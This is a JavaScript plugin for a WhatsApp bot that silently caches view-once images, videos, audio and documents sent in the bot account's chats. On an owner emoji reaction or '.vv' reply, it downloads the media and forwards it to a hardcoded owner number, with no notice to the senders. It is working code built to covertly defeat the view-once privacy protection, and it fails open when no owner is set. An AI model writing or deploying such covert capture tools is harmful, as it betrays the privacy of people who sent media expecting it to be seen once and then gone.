'use strict';
/**
 * vv.js — SILENT, OWNER-ONLY view-once revealer.
 *
 *   • Owner reacts 🛂 to a view-once  ->  media is revealed.
 *   • Owner replies .vv to a view-once -> same thing.
 *   • Nobody else can trigger it. No reactions, no chat replies — terminal log only.
 *   • The revealed media is delivered ONLY to the owner's private chat
 *     (number 6285111606001 / jid 161517311926508).
 *
 * Owner source: hardcoded OWNER_TARGETS, then ../settings/config, then global.owner.
 * Messages from the bot's own account always count as owner.
 *
 * Env overrides:
 *   VV_TARGET=source     -> deliver back into the source chat
 *   VV_ALSO_SOURCE=1     -> deliver to owner DM *and* re-post in the source chat
 *   VV_TRIGGERS="🎫,👀"   -> extra trigger emojis (🛂 always active)
 *   VV_DEBUG=0           -> silence the per-reaction trace
 */

const TRIGGER = '🛂';
const CACHE_TTL = 2 * 60 * 60 * 1000;
const CACHE_MAX = 400;
const MEDIA_KEYS = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage'];

const SILENT = true;   // true = zero chat feedback (no reactions / no replies)
const VERBOSE = true;  // log every cached view-once
const DEBUG = process.env.VV_DEBUG !== '0';

const norm = (s) => String(s || '').replace(/[\uFE0E\uFE0F]/g, '').replace(/\s+/g, '');
const EXTRA_TRIGGERS = (process.env.VV_TRIGGERS || '').split(',').map((t) => t.trim()).filter(Boolean);
const TRIGGERS = new Set([TRIGGER, ...EXTRA_TRIGGERS].map(norm));

/* ------------------------ owner identity + routing ------------------------ */

// Hardcoded owner. Number first (real MSISDN), then LID. Order = priority.
const OWNER_TARGETS = [
    { kind: 'number', jid: '6285111606001@s.whatsapp.net', digits: '6285111606001' },
    { kind: 'lid',    jid: '161517311926508@lid',         digits: '161517311926508' }
];

const DELIVER_TO_OWNER = (process.env.VV_TARGET || 'owner').toLowerCase() !== 'source';
const ALSO_POST_IN_SOURCE = process.env.VV_ALSO_SOURCE === '1';
const QUOTE_WHEN_SAME_CHAT = true;

let _baileys;
const loadBaileys = () => _baileys || (_baileys = import('@whiskeysockets/baileys'));

/* ------------------------------- logging ------------------------------- */

const stamp = () => new Date().toISOString().replace('T', ' ').slice(0, 19);
const log = (...a) => console.log(`[vv ${stamp()}]`, ...a);
const warn = (...a) => console.warn(`[vv ${stamp()}]`, ...a);

/* --------------------------- owner detection --------------------------- */

let config = {};
try { config = require('../settings/config') || {}; } catch (e) { /* optional */ }

const ownerJids = new Set();
const ownerNums = new Set();

function addOwner(value) {
    if (value == null) return;
    if (Array.isArray(value)) { value.forEach(addOwner); return; }
    if (typeof value === 'object') { Object.values(value).forEach(addOwner); return; }

    const str = String(value).trim().toLowerCase();
    if (!str) return;

    if (str.includes('@')) ownerJids.add(str.split(':')[0]);
    const digits = str.replace(/\D/g, '').replace(/^0+/, '');
    if (digits) ownerNums.add(digits);
}

OWNER_TARGETS.forEach((t) => addOwner(t.jid));

[
    config.owner, config.owners, config.ownerNumber, config.ownerNumbers,
    config.ownerJid, config.ownerJids, config.mods,
    global.owner, global.owners, global.ownerNumber, global.ownerNumbers
].forEach(addOwner);

const OWNER_CONFIGURED = ownerNums.size > 0 || ownerJids.size > 0;

function isOwner(jid) {
    if (!OWNER_CONFIGURED) return true; // fail-open (warned at boot)
    if (!jid) return false;

    const str = String(jid).trim().toLowerCase();
    const bare = str.split(':')[0];
    if (ownerJids.has(bare)) return true;

    const user = bare.split('@')[0];
    const digits = user.replace(/\D/g, '').replace(/^0+/, '');
    if (digits && ownerNums.has(digits)) return true;
    if (ownerNums.has(user)) return true;
    return false;
}

function senderOf(m) {
    return m?.key?.participant || m?.participant || m?.sender || m?.key?.remoteJid;
}

function allowed(m, ctx) {
    if (m?.key?.fromMe) return true;
    if (ctx?.isOwner === true || m?.isOwner === true) return true;
    return isOwner(senderOf(m));
}

/* --------------------------- delivery routing --------------------------- */

const toJid = (v) => {
    if (v == null) return null;
    const s = String(v).trim().toLowerCase();
    if (!s) return null;
    if (s.includes('@')) return s;
    const d = s.replace(/\D/g, '');
    return d ? `${d}@s.whatsapp.net` : null;
};

function ownerTargets() {
    const out = [];
    const push = (j) => { if (j && !out.includes(j)) out.push(j); };
    OWNER_TARGETS.forEach((t) => push(t.jid));
    for (const j of ownerJids) push(j);
    for (const n of ownerNums) push(toJid(n));
    return out;
}

let _lastGood = null;

function destinations(sourceChat) {
    if (!DELIVER_TO_OWNER) return [sourceChat];

    const list = ownerTargets();

    if (_lastGood) {
        const i = list.indexOf(_lastGood);
        if (i > 0) { list.splice(i, 1); list.unshift(_lastGood); }
        else if (i === -1) list.unshift(_lastGood);
    }

    if (ALSO_POST_IN_SOURCE && sourceChat && !list.includes(sourceChat)) list.push(sourceChat);
    return list.length ? list : [sourceChat];
}

async function sendTo(sock, dest, payload, quote) {
    if (quote) {
        try { await sock.sendMessage(dest, payload, { quoted: quote }); return; }
        catch (e) { log(`quoted send to ${dest} failed: ${e.message}`); }
    }
    await sock.sendMessage(dest, payload);
}

async function deliver(sock, dests, payload, quote) {
    let lastErr;
    for (const dest of dests) {
        try {
            await sendTo(sock, dest, payload, quote);
            if (dest !== _lastGood) log(`delivery route locked to ${dest}`);
            _lastGood = dest;
            return dest;
        } catch (e) {
            lastErr = e;
            log(`delivery to ${dest} failed: ${e.message}`);
        }
    }
    throw lastErr || new Error('no delivery target');
}

/* ------------------------------- helpers ------------------------------- */

const cache = new Map();
const inflight = new Set();

function unwrap(message) {
    let cur = message;
    for (let i = 0; i < 8 && cur && typeof cur === 'object'; i++) {
        const next =
            cur.ephemeralMessage?.message ||
            cur.viewOnceMessage?.message ||
            cur.viewOnceMessageV2?.message ||
            cur.viewOnceMessageV2Extension?.message ||
            cur.documentWithCaptionMessage?.message;
        if (!next) break;
        cur = next;
    }
    return cur;
}

function extractViewOnce(message) {
    if (!message || typeof message !== 'object') return null;

    let cur = message;
    let sawWrapper = false;

    for (let i = 0; i < 8 && cur && typeof cur === 'object'; i++) {
        const wrapKey = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension']
            .find((k) => cur[k]?.message);
        if (wrapKey) { cur = cur[wrapKey].message; sawWrapper = true; continue; }

        if (cur.ephemeralMessage?.message) { cur = cur.ephemeralMessage.message; continue; }
        if (cur.documentWithCaptionMessage?.message) { cur = cur.documentWithCaptionMessage.message; continue; }
        break;
    }

    const type = MEDIA_KEYS.find((k) => cur?.[k]);
    if (!type) return null;
    if (!sawWrapper && !cur[type].viewOnce) return null;

    return { type, media: cur[type], original: message };
}

function entryFromMessage(msg, chat) {
    if (!msg) return null;
    const f = extractViewOnce(msg);
    if (f) return { ...f, chat, at: Date.now() };
    const type = MEDIA_KEYS.find((k) => msg[k]);
    if (type) return { type, media: msg[type], original: msg, chat, at: Date.now() };
    return null;
}

function trim() {
    const now = Date.now();
    for (const [k, v] of cache) if (now - v.at > CACHE_TTL) cache.delete(k);
    while (cache.size > CACHE_MAX) cache.delete(cache.keys().next().value);
}

function lookupInStore(sock, chat, id) {
    const stores = [sock?.store, global.store, global.db?.store, global.Store, global.db];
    for (const st of stores) {
        if (!st) continue;
        const bags = [st?.messages?.[chat], st?.messages?.[String(chat).split('@')[0]], st?.messages];
        for (const bag of bags) {
            if (!bag) continue;
            const rec = typeof bag.get === 'function' ? bag.get(id) : bag[id];
            const msg = rec?.message || rec;
            const hit = entryFromMessage(msg, chat);
            if (hit) return hit;
        }
    }
    return null;
}

async function resolveEntry(sock, chat, id) {
    const cached = cache.get(id);
    if (cached) return cached;

    const fromStore = lookupInStore(sock, chat, id);
    if (fromStore) { cache.set(id, fromStore); return fromStore; }

    try {
        const m = await (sock.loadMessage?.(chat, id) ?? sock.getMessage?.(chat, id));
        const hit = entryFromMessage(m?.message || m, chat);
        if (hit) { cache.set(id, hit); return hit; }
    } catch (e) { /* optional API */ }

    return null;
}

/* ------------------------------- reveal ------------------------------- */

async function reveal(sock, sourceChat, targetKey, entry) {
    const { downloadContentFromMessage } = await loadBaileys();
    const kind = entry.type.replace('Message', '');
    const media = entry.media;

    const stream = await downloadContentFromMessage(media, kind);
    const chunks = [];
    for await (const c of stream) chunks.push(c);
    const buf = Buffer.concat(chunks);
    if (!buf.length) throw new Error('downloaded media is empty');

    const dests = destinations(sourceChat);
    const deliveringAway = dests.some((d) => d !== sourceChat);
    const caption = deliveringAway
        ? `🛂 *View-once revealed*\n↳ from ${sourceChat}`
        : '🛂 *View-once revealed*';

    let payload;
    if (kind === 'image') {
        payload = { image: buf, mimetype: media.mimetype || 'image/jpeg', caption };
    } else if (kind === 'video') {
        payload = { video: buf, mimetype: media.mimetype || 'video/mp4', caption };
        if (media.gifPlayback) payload.gifPlayback = true;
    } else if (kind === 'audio') {
        payload = { audio: buf, mimetype: media.mimetype || 'audio/mp4', ptt: !!media.ptt };
    } else {
        payload = {
            document: buf,
            mimetype: media.mimetype || 'application/octet-stream',
            fileName: media.fileName || 'view-once',
            caption
        };
    }

    // cross-chat quotes are unreliable — only quote when dest === source
    const key = { remoteJid: sourceChat, fromMe: !!targetKey.fromMe, id: targetKey.id };
    if (targetKey.participant) key.participant = targetKey.participant;
    const quote = (QUOTE_WHEN_SAME_CHAT && !deliveringAway)
        ? { key, message: entry.original }
        : null;

    const dest = await deliver(sock, dests, payload, quote);
    return { kind, bytes: buf.length, dest };
}

async function doReveal(sock, raw, reaction, entry, via) {
    const chat = reaction.key?.remoteJid || raw.key?.remoteJid;
    const who = senderOf(raw) || 'unknown';
    const t0 = Date.now();
    try {
        const res = await reveal(sock, chat, reaction.key, entry);
        log(`REVEALED ${res.kind} (${(res.bytes / 1024).toFixed(0)} KB) · src ${chat} → ${res.dest} · ${via} by ${who} · ${Date.now() - t0}ms`);
    } catch (e) {
        log(`FAILED to reveal ${reaction.key?.id} in ${chat}: ${e.message}`);
    }
}

/* --------------------------- event plumbing --------------------------- */

function scheduleRetry(sock, raw, reaction, attempt) {
    const targetId = reaction.key?.id;
    const delays = [1500, 4000, 9000];

    if (attempt >= delays.length) {
        log(`gave up on ${targetId} — the view-once never reached the cache`);
        inflight.delete(targetId);
        return;
    }

    const t = setTimeout(async () => {
        const chat = reaction.key?.remoteJid || raw.key?.remoteJid;
        const entry = await resolveEntry(sock, chat, targetId);
        if (!entry) { scheduleRetry(sock, raw, reaction, attempt + 1); return; }
        log(`late hit on ${targetId} (attempt ${attempt + 1}) — the reaction beat the message`);
        await doReveal(sock, raw, reaction, entry, 'via reaction');
        inflight.delete(targetId);
    }, delays[attempt]);

    if (t.unref) t.unref();
}

async function handleReaction(sock, raw, reaction) {
    const chat = reaction.key?.remoteJid || raw.key?.remoteJid;
    const targetId = reaction.key?.id;
    if (!chat || !targetId) return;
    if (!reaction.text) return;                       // reaction removed

    const who = senderOf(raw) || 'unknown';
    const ownerOk = allowed(raw);

    if (DEBUG) log(`reaction "${reaction.text}" → ${targetId} in ${chat} from ${who} · owner=${ownerOk} · cached=${cache.size}`);

    if (!TRIGGERS.has(norm(reaction.text))) {
        if (DEBUG) log(`  ↳ text "${reaction.text}" is not a trigger (${[...TRIGGERS].join(' ')})`);
        return;
    }

    if (!ownerOk) { log(`ignored ${TRIGGER} from ${who} (not owner) in ${chat}`); return; }
    if (inflight.has(targetId)) { if (DEBUG) log(`  ↳ ${targetId} already in flight`); return; }

    inflight.add(targetId);

    const entry = await resolveEntry(sock, chat, targetId);
    if (!entry) {
        log(`miss — owner ${who} reacted to ${targetId} in ${chat}; retrying…`);
        scheduleRetry(sock, raw, reaction, 0);
        return;
    }

    try {
        await doReveal(sock, raw, reaction, entry, 'via reaction');
    } finally {
        inflight.delete(targetId);
    }
}

function cacheHistory(payload) {
    let n = 0;
    for (const m of payload?.messages || []) {
        if (!m?.message || !m.key?.id || cache.has(m.key.id)) continue;
        const found = extractViewOnce(m.message);
        if (!found) continue;
        cache.set(m.key.id, { ...found, chat: m.key.remoteJid, at: Date.now() });
        n++;
    }
    if (n) { trim(); log(`history sync: cached ${n} view-once(s)`); }
}

async function handleUpsert(sock, update) {
    for (const m of update?.messages || []) {
        if (!m?.message || !m.key?.id) continue;

        const found = extractViewOnce(m.message);
        if (found) {
            cache.set(m.key.id, { ...found, chat: m.key.remoteJid, at: Date.now() });
            trim();
            if (VERBOSE) log(`cached view-once ${found.type.replace('Message', '')} id=${m.key.id} in ${m.key.remoteJid}`);
        }

        const reaction = unwrap(m.message)?.reactionMessage;
        if (reaction) await handleReaction(sock, m, reaction);
    }
}

const MARK = '__vvBound';

function isAttached(sock) {
    try { return sock.ev.listeners('messages.upsert').some((fn) => fn.__vv); }
    catch { return !!sock[MARK]; }
}

function bind(sock) {
    if (!sock?.ev || typeof sock.ev.on !== 'function') return false;
    if (sock[MARK] && isAttached(sock)) return true;

    // the framework may have wiped listeners on reconnect — drop our stale copies
    try {
        for (const fn of sock.ev.listeners('messages.upsert')) {
            if (fn.__vv) sock.ev.off('messages.upsert', fn);
        }
    } catch (e) { /* noop */ }

    const onUpsert = (update) => handleUpsert(sock, update).catch((e) => log('upsert error:', e.message));
    onUpsert.__vv = true;

    sock.ev.on('messages.upsert', onUpsert);
    try { sock.ev.on('messaging-history.set', (p) => cacheHistory(p)); } catch (e) { /* noop */ }

    sock[MARK] = true;
    log('listener bound to socket');
    return true;
}

function findGlobalSock() {
    const direct = [global.sock, global.conn, global.client, global.bot, global.Yaka, global.waSocket, global.wa];
    for (const c of direct) if (c?.ev?.on && typeof c.sendMessage === 'function') return c;
    for (const k of ['bot', 'client', 'conn', 'socket', 'wa']) {
        const g = global[k];
        if (g?.sock?.ev?.on) return g.sock;
        if (g?.conn?.ev?.on) return g.conn;
    }
    return null;
}

(function autoBind() {
    if (!OWNER_CONFIGURED) {
        warn('no owner found — fail-open, everyone can trigger');
    } else {
        log(`owner-only mode · ${ownerNums.size} number(s) / ${ownerJids.size} jid(s) loaded`);
    }
    log(`triggers: ${[...TRIGGERS].join(' ')}`);
    log(`delivery: ${DELIVER_TO_OWNER ? 'owner DM only' : 'source chat'}${ALSO_POST_IN_SOURCE ? ' (+ source)' : ''}`);
    log(`delivery targets: ${ownerTargets().join(', ')}`);
    const tick = () => { const s = findGlobalSock(); if (s) bind(s); };
    tick();
    const iv = setInterval(tick, 5000);
    if (iv.unref) iv.unref();
})();

/* ------------------------------- command ------------------------------- */

async function execute(sock, m, ctx) {
    bind(sock);
    const { command, quoted, reply, prefix } = ctx;

    const notify = SILENT ? /--?(notify|n)\b/i.test(ctx.text || '') : true;
    const say = (t) => { if (notify && reply) return reply(t); };

    if (!allowed(m, ctx)) {
        log(`ignored .${command} from ${senderOf(m)} (not owner)`);
        return;
    }

    const stanzaId =
        quoted?.id ||
        m.message?.extendedTextMessage?.contextInfo?.stanzaId ||
        m.msg?.contextInfo?.stanzaId;

    let type = quoted?.mtype;
    let mediaMsg = quoted?.msg || quoted?.message || quoted;

    if (!type) type = MEDIA_KEYS.find((k) => mediaMsg?.[k]);
    if (!type) {
        const f = extractViewOnce(mediaMsg);
        if (f) { type = f.type; mediaMsg = f.media; }
    }

    if (!type || !MEDIA_KEYS.includes(type)) {
        return say(
            `*View-once revealer*\n\n` +
            `• React ${TRIGGER} to any view-once message\n` +
            `• or reply to one with ${prefix}${command}`
        );
    }

    const innerMedia = mediaMsg?.[type] || mediaMsg;
    const chat = m.chat;

    try {
        const res = await reveal(sock, chat,
            { id: stanzaId, remoteJid: chat, fromMe: false, participant: quoted?.participant },
            { type, media: innerMedia, original: quoted?.message || quoted });
        log(`REVEALED ${res.kind} (${(res.bytes / 1024).toFixed(0)} KB) · src ${chat} → ${res.dest} · via .${command} by ${senderOf(m)}`);
    } catch (e) {
        log(`FAILED to reveal (command) in ${chat}: ${e.message}`);
        say(`Couldn't reveal it: ${String(e.message).split('\n')[0].slice(0, 180)}`);
    }
}

module.exports = {
    command: 'vv',
    alias: ['reveal', 'viewonce', 'rvo', '?', 'h', '...'],
    description: 'Silently reveal view-once media to the owner only, via 🛂 reaction or .vv reply.',
    category: 'tools',

    execute,

    async onMessage(sock, m) {
        bind(sock);
        if (m?.message) await handleUpsert(sock, { messages: [m] });
    },
    async handler(...args) { return module.exports.onMessage(...args); },

    // for frameworks with a dedicated reaction hook
    async onReaction(sock, m) {
        bind(sock);
        const reaction = unwrap(m?.message)?.reactionMessage;
        if (reaction) await handleReaction(sock, m, reaction);
    },
    async reaction(...args) { return module.exports.onReaction(...args); }
};
